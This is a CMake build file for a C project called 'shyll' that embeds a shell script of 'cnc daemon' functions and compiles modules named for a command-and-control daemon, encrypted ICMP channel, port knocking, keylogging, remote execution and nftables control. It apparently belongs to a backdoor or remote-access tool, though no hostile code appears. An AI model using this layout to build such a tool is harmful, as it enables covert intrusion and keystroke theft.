cmake_minimum_required(VERSION 3.28.3)
project(shyll C)

set(CMAKE_C_STANDARD 11)
set(GENERATED_DIR "${CMAKE_CURRENT_BINARY_DIR}/generated/")
set(CNC_DATA_OUTPUT "${GENERATED_DIR}/cncdaemon_data.h")
set(CNC_DATA_INPUT "${CMAKE_CURRENT_SOURCE_DIR}/data/cnc_daemon_functions.sh")
set(CNC_DATA_TEMPLATE "${CMAKE_CURRENT_SOURCE_DIR}/template/cncdaemon_data.h.in")

file(MAKE_DIRECTORY ${GENERATED_DIR})

add_custom_command(
        OUTPUT ${CNC_DATA_OUTPUT}
        COMMAND ${CMAKE_COMMAND}
                -DDATA_PATH="${CNC_DATA_INPUT}"
                -DTEMPLATE_PATH="${CNC_DATA_TEMPLATE}"
                -DOUTPUT_PATH="${CNC_DATA_OUTPUT}"
                -P "${CMAKE_CURRENT_SOURCE_DIR}/data.cmake"
        DEPENDS "${CNC_DATA_INPUT}"
        COMMENT "Generating embedded cnc bash init data"
)

add_custom_target(generate_embedded_data ALL DEPENDS ${CNC_DATA_OUTPUT})

find_package(OpenSSL REQUIRED)

include_directories("${CMAKE_CURRENT_SOURCE_DIR}/include")

add_executable(shyll
        src/client.c
        src/cncdaemon.c
        src/handshake.c
        src/handshake_id.c
        src/icmp.c
        src/icmp_encrypt.c
        src/keyboard.c
        src/keylog_service.c
        src/main.c
        src/notify_service.c
        src/server.c
        src/stream.c
        src/stream_exec.c
        src/stream_id.c
        src/util.c
        src/knocking.c
        src/nftables_control_service.c
        src/nftables.c
        src/admin_service.c)
target_link_libraries(shyll OpenSSL::Crypto)

target_include_directories(shyll PRIVATE ${GENERATED_DIR})
add_dependencies(shyll generate_embedded_data)
